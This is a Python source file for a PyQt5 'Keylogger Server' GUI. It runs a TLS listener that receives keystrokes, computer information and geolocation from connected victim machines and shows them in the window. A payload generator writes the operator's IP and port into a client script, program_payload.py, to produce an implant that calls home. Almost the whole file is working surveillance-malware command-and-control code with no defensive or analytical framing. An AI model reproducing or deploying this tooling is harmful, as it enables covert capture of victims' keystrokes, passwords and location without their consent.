import os
import socket
import ssl
import subprocess
import sys
import threading
from contextlib import contextmanager
from dataclasses import dataclass
from typing import Dict, Optional

from PyQt5.QtCore import pyqtSignal, QObject, Qt
from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox

from gui.controllers.Dashboard import Ui_MainWindow
from gui.controllers.PrepareClientPayload import Ui_PrepareClientPayload
from gui.controllers.SetEmailInfo import Ui_SetEmaiInfo




@dataclass(frozen=True, slots=True)
class ClientInfo:
    socket: socket.socket
    address: tuple
    client_id: str
    common_name: Optional[str] = None

    def __str__(self):
        cn = f" ({self.common_name})" if self.common_name else ""
        return f"{self.address[0]}:{self.address[1]}{cn}"


@dataclass(frozen=True, slots=True)
class ServerConfig:
    host: str = '0.0.0.0'
    port: int = 10000
    max_clients: int = 1
    cert_dir: str = 'certs'

    @property
    def server_cert(self) -> str:
        return os.path.join(self.cert_dir, 'server_cert.pem')

    @property
    def server_key(self) -> str:
        return os.path.join(self.cert_dir, 'server_key.pem')

    @property
    def ca_cert(self) -> str:
        return os.path.join(self.cert_dir, 'ca_cert.pem')

    @property
    def crl_file(self) -> str:
        return os.path.join(self.cert_dir, 'crl.pem')




class SSLContextManager:
    __slots__ = ('config', '_context')

    def __init__(self, config: ServerConfig):
        self.config = config
        self._context: Optional[ssl.SSLContext] = None

    def create_context(self) -> ssl.SSLContext:
        """Create and cache SSL context (singleton pattern)"""
        if self._context:
            return self._context

        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(self.config.server_cert, self.config.server_key)
            context.verify_mode = ssl.CERT_REQUIRED
            context.load_verify_locations(cafile=self.config.ca_cert)

            if os.path.exists(self.config.crl_file):
                context.load_verify_locations(cafile=self.config.crl_file)
                context.verify_flags = ssl.VERIFY_CRL_CHECK_LEAF

            context.set_ciphers(
                'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:'
                '!aNULL:!MD5:!DSS'
            )
            context.minimum_version = ssl.TLSVersion.TLSv1_2

            self._context = context
            self._log_context_info()
            return context

        except FileNotFoundError as e:
            raise RuntimeError(
                f"Certificate file not found: {e}\n"
                "Please run generate_certificates.py first!"
            )
        except Exception as e:
            raise RuntimeError(f"Error creating SSL context: {e}")

    def _log_context_info(self):
        crl_status = 'enabled' if os.path.exists(self.config.crl_file) else 'disabled'
        print(f"[+] SSL context created successfully")
        print(f"    - Server cert: {self.config.server_cert}")
        print(f"    - CA cert: {self.config.ca_cert}")
        print(f"    - CRL: {crl_status}")
        print(f"    - Client auth: REQUIRED")




class ClientManager:

    __slots__ = ('max_clients', '_clients', '_lock')

    def __init__(self, max_clients: int = 1):
        self.max_clients = max_clients
        self._clients: Dict[str, ClientInfo] = {}
        self._lock = threading.Lock()

    def can_accept_client(self) -> bool:
        """Check capacity without holding lock"""
        with self._lock:
            return len(self._clients) < self.max_clients

    def add_client(self, client_info: ClientInfo) -> bool:
        """Atomically add client if space available"""
        with self._lock:
            if len(self._clients) >= self.max_clients:
                return False
            self._clients[client_info.client_id] = client_info
            return True

    def remove_client(self, client_id: str) -> Optional[ClientInfo]:
        """Atomically remove client"""
        with self._lock:
            return self._clients.pop(client_id, None)

    def get_client(self, client_id: str) -> Optional[ClientInfo]:
        """Get client info (read-only, minimal lock time)"""
        with self._lock:
            return self._clients.get(client_id)

    @contextmanager
    def get_clients_snapshot(self):
        """Thread-safe iteration with snapshot pattern"""
        with self._lock:
            snapshot = list(self._clients.items())
        yield snapshot




class Worker(QObject):

    # Signals
    keylog_signal = pyqtSignal(str, str)
    computer_info_signal = pyqtSignal(str, str)
    geo_location_signal = pyqtSignal(str, str)
    client_connected_signal = pyqtSignal(str)
    client_disconnected_signal = pyqtSignal(str)
    error_signal = pyqtSignal(str)

    __slots__ = ('config', 'ssl_manager', 'client_manager', '_running')

    def __init__(self, config: ServerConfig):
        super().__init__()
        self.config = config
        self.ssl_manager = SSLContextManager(config)
        self.client_manager = ClientManager(config.max_clients)
        self._running = False

    def start_server(self):
        self._running = True

        try:
            ssl_context = self.ssl_manager.create_context()
        except RuntimeError as e:
            self.error_signal.emit(str(e))
            return

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as bind_socket:
            # Optimize socket options
            bind_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            bind_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            bind_socket.bind((self.config.host, self.config.port))
            bind_socket.listen(5)

            print(f"[*] Server listening on {self.config.host}:{self.config.port}")
            print("[*] Waiting for client connections...")

            while self._running:
                try:
                    self._accept_client(bind_socket, ssl_context)
                except Exception as e:
                    print(f"[!] Error in accept loop: {e}")

    def _accept_client(self, bind_socket: socket.socket, ssl_context: ssl.SSLContext):
        """Accept and validate client connection"""
        raw_socket, address = bind_socket.accept()

        if not self.client_manager.can_accept_client():
            print(f"[-] Connection rejected from {address}: Server full")
            raw_socket.close()
            return

        print(f"[*] Raw connection from {address}, initiating SSL handshake...")

        try:
            ssl_socket = ssl_context.wrap_socket(raw_socket, server_side=True)
            client_info = self._extract_client_info(ssl_socket, address)
        except ssl.SSLError as e:
            print(f"[!] SSL handshake failed from {address}: {e}")
            raw_socket.close()
            return
        except Exception as e:
            print(f"[!] Error during SSL handshake from {address}: {e}")
            raw_socket.close()
            return

        if not self.client_manager.add_client(client_info):
            print(f"[-] Could not add client {client_info}")
            ssl_socket.close()
            return

        print(f"[+] Client authenticated: {client_info}")
        self.client_connected_signal.emit(client_info.client_id)

        # Use daemon thread for automatic cleanup
        thread = threading.Thread(
            target=self._handle_client,
            args=(client_info,),
            daemon=True
        )
        thread.start()

    def _extract_client_info(self, ssl_socket: socket.socket, address: tuple) -> ClientInfo:
        """Extract and validate client certificate info"""
        common_name = None
        cert = ssl_socket.getpeercert()

        if cert:
            for subject in cert.get('subject', []):
                for key, value in subject:
                    if key == 'commonName':
                        common_name = value
                        break

        client_id = f"{address[0]}:{address[1]}"
        cipher = ssl_socket.cipher()

        print(f"[+] SSL handshake successful!")
        print(f"    - Cipher: {cipher}")
        print(f"    - TLS Version: {ssl_socket.version()}")

        return ClientInfo(
            socket=ssl_socket,
            address=address,
            client_id=client_id,
            common_name=common_name
        )

    def _handle_client(self, client_info: ClientInfo):
        """Handle client data with optimized buffering"""
        buffer = bytearray()  # Use bytearray for efficient appending

        try:
            while self._running:
                try:
                    chunk = client_info.socket.recv(4096)
                    if not chunk:
                        break

                    buffer.extend(chunk)

                    # Process complete lines efficiently
                    while b'\n' in buffer:
                        line_end = buffer.index(b'\n')
                        line = buffer[:line_end].decode('utf-8', errors='ignore')
                        del buffer[:line_end + 1]  # Remove processed line

                        if line.strip():
                            self._process_message(client_info.client_id, line.strip())

                except UnicodeDecodeError:
                    # Skip corrupted data
                    continue
                except Exception as e:
                    print(f"[!] Error receiving from {client_info.client_id}: {e}")
                    break

        finally:
            self._disconnect_client(client_info)

    def _process_message(self, client_id: str, data: str):
        """Process messages with optimized string operations"""
        if not data:
            return

        print(f"[+] Data from {client_id}: {data[:100]}...")

        # Use startswith for efficiency (O(1) for prefix check)
        if data.startswith("KEYLOG:"):
            keylog_data = data[7:]
            self.keylog_signal.emit(client_id, keylog_data)
        elif data.startswith("COMPUTER_INFO:"):
            formatted = data[15:].replace(" | ", "\n")
            self.computer_info_signal.emit(client_id, formatted)
        elif data.startswith("GEO_LOCATION:"):
            formatted = data[13:].replace(" | ", "\n")
            self.geo_location_signal.emit(client_id, formatted)
        else:
            print(f"[!] Unknown message type: {data[:50]}")

    def _disconnect_client(self, client_info: ClientInfo):
        """Cleanup disconnected client"""
        try:
            client_info.socket.close()
        except:
            pass

        self.client_manager.remove_client(client_info.client_id)
        print(f"[-] Client disconnected: {client_info.client_id}")
        self.client_disconnected_signal.emit(client_info.client_id)

    def stop(self):
        """Gracefully stop server"""
        self._running = False




class MainWindow(QMainWindow):
    __slots__ = ('config', 'ui', 'computer_info_display',
                 'geo_location_display', 'keylog_display', 'worker',
                 'payload_window', 'payload_ui', 'email_window', 'email_ui')

    def __init__(self):
        super().__init__()

        # Configuration with default port
        self.config = ServerConfig(port=10000)

        # Setup UI
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        self._setup_displays()
        self._connect_signals()

        # Start server
        self._start_server()

        # Set window title
        self.setWindowTitle(f"Keylogger Server - Listening on port {self.config.port}")

    def _setup_displays(self):
        """Configure display widgets efficiently"""
        self.computer_info_display = self.ui.plainTextEdit
        self.geo_location_display = self.ui.plainTextEdit_2
        self.keylog_display = self.ui.plainTextEdit_3

        # Set placeholders once
        placeholders = [
            (self.keylog_display, "Waiting for client..."),
            (self.computer_info_display, "No computer info"),
            (self.geo_location_display, "No geo-location data")
        ]

        for widget, text in placeholders:
            widget.setPlaceholderText(text)

    def _connect_signals(self):
        """Connect UI signals to slots"""
        self.ui.PrepareClientPayload.clicked.connect(self._open_payload_window)
        self.ui.actionSet_Email_Info.triggered.connect(self._open_email_info)
        self.ui.RefreshButton.clicked.connect(self._refresh_logs)
        self.ui.actionLight_Mode.triggered.connect(lambda: self._set_theme("light"))
        self.ui.actionDark_Mode.triggered.connect(lambda: self._set_theme("dark"))
        self.ui.actionGenerate_Certificates.triggered.connect(self._generate_certificates)
        self.ui.actionRevoke_Certificate.triggered.connect(self._revoke_certificate)

    def _generate_certificates(self):
        """Generate SSL certificates"""
        subprocess.run(["python", "generate_certificates.py"])
        print("[*] Certificates generated")

    def _revoke_certificate(self):
        """Revoke a client certificate"""
        from PyQt5.QtWidgets import QInputDialog

        if not os.path.exists("certs"):
            return

        # Get certificate list efficiently
        cert_files = [
            f.replace("_cert.pem", "")
            for f in os.listdir("certs")
            if f.endswith("_cert.pem") and not f.startswith(("server", "ca"))
        ]

        if cert_files:
            client_name, ok = QInputDialog.getItem(
                self, "Revoke Certificate",
                "Select client:",
                cert_files, 0, False
            )

            if ok:
                subprocess.run(["python", "revoke_certificates.py", "revoke", client_name])
                print(f"[*] Certificate revoked: {client_name}")

    def _start_server(self):
        """Initialize and start server worker"""
        self.worker = Worker(self.config)

        # Connect signals with unique connection to prevent duplicates
        self.worker.keylog_signal.connect(
            self._update_keylog, Qt.QueuedConnection | Qt.UniqueConnection
        )
        self.worker.computer_info_signal.connect(
            self._update_computer_info, Qt.QueuedConnection | Qt.UniqueConnection
        )
        self.worker.geo_location_signal.connect(
            self._update_geo_location, Qt.QueuedConnection | Qt.UniqueConnection
        )
        self.worker.client_connected_signal.connect(
            self._on_client_connected, Qt.UniqueConnection
        )
        self.worker.client_disconnected_signal.connect(
            self._on_client_disconnected, Qt.UniqueConnection
        )
        self.worker.error_signal.connect(
            self._on_server_error, Qt.UniqueConnection
        )

        # Start in daemon thread
        thread = threading.Thread(target=self.worker.start_server, daemon=True)
        thread.start()

    # Signal Handlers (Qt slot optimization with direct connections)

    def _on_client_connected(self, client_id: str):
        """Handle client connection"""
        print(f"[MainWindow] Client connected: {client_id}")
        self.setWindowTitle(f"Keylogger Server - Connected: {client_id}")
        self.keylog_display.clear()
        self.keylog_display.appendPlainText(f"=== Connected: {client_id} ===\n")

    def _on_client_disconnected(self, client_id: str):
        """Handle client disconnection"""
        print(f"[MainWindow] Client disconnected: {client_id}")
        self.setWindowTitle("Keylogger Server - No Client")
        self.keylog_display.appendPlainText("\n--- Client Disconnected ---\n")

    def _on_server_error(self, error: str):
        """Handle server errors"""
        QMessageBox.critical(self, "Server Error", error)

    def _update_keylog(self, client_id: str, data: str):
        """Update keylog display (optimized for frequent updates)"""
        self.keylog_display.appendPlainText(data)
        self.keylog_display.ensureCursorVisible()

    def _update_computer_info(self, client_id: str, data: str):
        """Update computer info display"""
        self.computer_info_display.setPlainText(data.strip())

    def _update_geo_location(self, client_id: str, data: str):
        """Update geo-location display"""
        self.geo_location_display.setPlainText(data)

    # UI Actions

    def _open_payload_window(self):
        """Open payload generation window"""
        try:
            self.payload_window = QMainWindow()
            self.payload_ui = Ui_PrepareClientPayload()
            self.payload_ui.setupUi(self.payload_window)

            # Set default values
            self.payload_ui.lineEdit.setText("")  # Empty - user fills in their IP
            self.payload_ui.lineEdit_2.setText("10000")  # Default port

            self.payload_ui.pushButton.clicked.connect(self._generate_payload)
            self.payload_window.show()

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Could not open window: {e}")

    def _restart_server_with_new_port(self, new_port: int) -> bool:
        """Restart server on new port"""
        try:
            if hasattr(self, 'worker'):
                # Disconnect all signals before stopping
                try:
                    self.worker.keylog_signal.disconnect()
                    self.worker.computer_info_signal.disconnect()
                    self.worker.geo_location_signal.disconnect()
                    self.worker.client_connected_signal.disconnect()
                    self.worker.client_disconnected_signal.disconnect()
                    self.worker.error_signal.disconnect()
                except:
                    pass  # Ignore if already disconnected

                self.worker.stop()
                print(f"[*] Stopping server on port {self.config.port}")

            # Update configuration (create new immutable config)
            self.config = ServerConfig(
                host=self.config.host,
                port=new_port,
                max_clients=self.config.max_clients,
                cert_dir=self.config.cert_dir
            )

            self._start_server()
            self.setWindowTitle(f"Keylogger Server - Listening on port {new_port}")
            print(f"[*] Server restarted on port {new_port}")
            return True

        except Exception as e:
            QMessageBox.critical(self, "Error", f"Could not restart server:\n{e}")
            return False

    def _generate_payload(self):
        """Generate client payload with validation"""
        server_ip = self.payload_ui.lineEdit.text().strip()
        server_port = self.payload_ui.lineEdit_2.text().strip()

        # Validation
        if not server_ip:
            QMessageBox.warning(self.payload_window, "Error", "Server IP required")
            return

        try:
            port = int(server_port) if server_port else 10000
            if not 1 <= port <= 65535:
                raise ValueError("Port must be between 1-65535")
        except ValueError as e:
            QMessageBox.warning(self.payload_window, "Error", f"Invalid port: {e}")
            return

        # Generate payload efficiently
        try:
            with open("program.py", "r", encoding='utf-8') as f:
                code = f.read()

            # Single pass string replacement
            modified = (code
                        .replace('SSL_SERVER_HOST = "127.0.0.1"', f'SSL_SERVER_HOST = "{server_ip}"')
                        .replace('SSL_SERVER_PORT = 10000', f'SSL_SERVER_PORT = {port}'))

            with open("program_payload.py", "w", encoding='utf-8') as f:
                f.write(modified)

            # Handle port change
            if port != self.config.port:
                reply = QMessageBox.question(
                    self.payload_window,
                    "Port Changed",
                    f"Server port will change from {self.config.port} to {port}.\n\n"
                    f"Restart server now to listen on new port?",
                    QMessageBox.Yes | QMessageBox.No
                )

                if reply == QMessageBox.Yes:
                    if self._restart_server_with_new_port(port):
                        QMessageBox.information(
                            self.payload_window,
                            "Success",
                            f"Payload generated and server restarted!\n\n"
                            f"File: program_payload.py\n"
                            f"Server: {server_ip}:{port}\n"
                            f"Now listening on port {port}"
                        )
                    return

            QMessageBox.information(
                self.payload_window,
                "Success",
                f"Payload generated!\n\n"
                f"File: program_payload.py\n"
                f"Server: {server_ip}:{port}"
            )

        except Exception as e:
            QMessageBox.critical(self.payload_window, "Error", str(e))

    def _open_email_info(self):
        """Open email configuration window"""
        self.email_window = QMainWindow()
        self.email_ui = Ui_SetEmaiInfo()
        self.email_ui.setupUi(self.email_window)
        self.email_window.show()

    def _refresh_logs(self):
        """Clear all displays efficiently"""
        self.keylog_display.clear()
        self.computer_info_display.clear()
        self.geo_location_display.clear()
        print("[*] Logs cleared")

    def _set_theme(self, theme: str):
        """Set application theme"""
        stylesheet = (
            "background-color: white; color: black;" if theme == "light"
            else "background-color: #2E2E2E; color: white;"
        )
        self.setStyleSheet(stylesheet)
        print(f"[*] Theme: {theme}")



def main():
    app = QApplication(sys.argv)
    app.setApplicationName("Keylogger Server")
    app.setOrganizationName("SecurityTools")

    window = MainWindow()
    window.show()

    sys.exit(app.exec_())


if __name__ == "__main__":
    main()